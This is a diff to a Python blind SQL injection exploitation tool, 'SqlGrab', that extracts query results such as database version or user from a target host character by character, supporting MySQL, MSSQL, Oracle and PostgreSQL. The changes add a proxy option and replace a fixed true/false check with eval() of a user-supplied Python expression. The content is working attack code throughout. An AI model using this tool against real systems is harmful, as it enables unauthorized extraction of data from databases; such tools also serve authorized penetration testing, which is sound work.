@@ -55,39 +55,46 @@ class SqlGrab:
     initialCharacter = ord('Z')
     payloadLocations = []
 
-    proxies = {
-        "http": "https://127.0.0.1:8080",
-                "https": "http://127.0.0.1:8080",
-    }
 
-    session = Session()
+    def __init__(self, options):
+        # set options
+        self.urlencode = options.urlencode
+        self.delay = options.delay
+        self.payloads = self.payloads[options.dbms]
+        self.condition = options.condition
+        self.session = Session()
 
-    def __init__(self, args):
-        self.urlencode = args.urlencode
-        self.delay = args.delay
-        self.payloads = self.payloads[args.dbms]
+        if options.proxy:
+            self.proxy = {
+                'http': options.proxy,
+                'https': options.proxy
+            }
+        else:
+            self.proxy = {}
 
         try:
-            self.request = self.parseRequest(args.host, args.filename)
-
+            # parse the base request from file
+            self.request = self.parseRequest(options.host, options.request)
             print(
-                f'[*] Query: \'{args.query}\'. Inserting payload into {", ".join(self.payloadLocations)}. Determining length...')
+                f'[*] Query: \'{options.query}\'. Inserting payload into {", ".join(self.payloadLocations)}. Determining length...')
 
-            length = self.getLength(query=args.query)
-
+            # get the length of the query output
+            length = self.getLength(query=options.query)
             print(f'[*] The query output is {length} characters in length.')
 
-            result = self.getString(query=args.query, length=length)
-
+            # retrieve the output
+            result = self.getString(query=options.query, length=length)
             print(f'\n{result}')
 
         except RuntimeError:
             print('The result was invalid, either due to a syntax error or because no result exists. Send the requests to Repeater and sanity check them.', file=sys.stderr)
         except Exception as e:
             print(e)
+        except KeyboardInterrupt:
+            print('Interrupted')
 
     def isMatch(self, response):  # Change me to whatever condition counts as True
-        return "Welcome back!" in response.text
+        return eval(self.condition, locals())
         # examples:
         # return response.status_code == 403
         # return response.elapsed > datetime.timedelta(milliseconds=100)
@@ -167,7 +174,7 @@ class SqlGrab:
 
         response = self.session.send(
             prepared,
-            proxies=self.proxies,
+            proxies=self.proxy,
             verify=False
         )
 
@@ -216,15 +223,21 @@ if __name__ == "__main__":
     parser = argparse.ArgumentParser(
         description='Extracts string data from a conditional SQLi vulnerability using a binary search tree approach.'
     )
-    parser.add_argument('-u', '--host', required=True, help='Host URL, including protocol scheme and optionally port. E.g. https://target.com:80')
+    parser.add_argument('-u', '--host', required=True,
+                        help='Host URL, including protocol scheme and optionally port. E.g. https://target.com:80')
     parser.add_argument('-r', '--request', required=True,
                         help='Request file containing one or more \'{payload}\' tags')
-    parser.add_argument('-q', '--query', required=True, help='SQL query to extract the response of. Must return a single string, e.g. @@version, SELECT user FROM dual')
-    parser.add_argument('-d', '--dbms', required=True, choices=['mysql', 'mssql', 'oracle', 'postgresql'])
+    parser.add_argument('-q', '--query', required=True,
+                        help='SQL query to extract the response of. Must return a single string, e.g. @@version, SELECT user FROM dual')
+    parser.add_argument('-d', '--dbms', required=True,
+                        choices=['mysql', 'mssql', 'oracle', 'postgresql'])
+    parser.add_argument('-c', '--condition', required=True, help='Python expression to evaluate to determine true/false from the response. E.g. \'"error" in response.text\', \'response.error_code == 401\', \'len(response.content) > 1433\'')
     parser.add_argument('--delay', required=False, default=0,
                         help='Delay in seconds to add between requests. Optional. E.g. 1, 0.2')
     parser.add_argument('--urlencode', required=False, action='store_false',
                         help='Perform URL-encoding on the payloads. Optional. E.g. True, False')
+    parser.add_argument('--proxy', required=False,
+                        help='Proxy to use, e.g. http://127.0.0.1:8080')
 
     args = parser.parse_args()
 
